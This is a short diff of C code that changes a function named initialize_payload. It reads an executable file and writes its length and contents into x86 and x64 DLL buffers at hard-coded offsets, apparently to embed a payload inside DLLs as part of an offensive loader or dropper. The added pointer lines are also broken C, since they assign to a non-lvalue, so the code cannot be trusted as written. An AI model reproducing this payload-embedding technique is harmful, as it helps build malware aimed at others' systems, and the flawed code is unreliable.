@@ -56,13 +56,16 @@ HGLOBAL initialize_payload()
 		if(fileHandle != INVALID_FILE_HANDLE)
 		{
 			fileSize = GetFileSize(fileHandle, NULL);
-			EXE_BUFFER[0] = fileSize; //Dword length written here
-			ReadFile(fileHandle, EXE_BUFFER+4, &fileSize, &NumberOfBytesRead, 0);
+			*(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
+			*(DWORD*)hDLL_x64 + 0xc8a4 = fileSize; //Dword length written in x64 DLL buffer
+			ReadFile(fileHandle, hDLL_x86 + 0x4060 + 4, &fileSize, &NumberOfBytesRead, 0);
+			ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + 4, &fileSize, &NumberOfBytesRead, 0);
     			CloseHandle(fileHandle);
 		}
 	}
 	else
 	{
+		//if problem
 		GlobalFree(hMemory_x86);
 		GlobalFree(hMemory_x64);
 		abort(); // or return NULL;
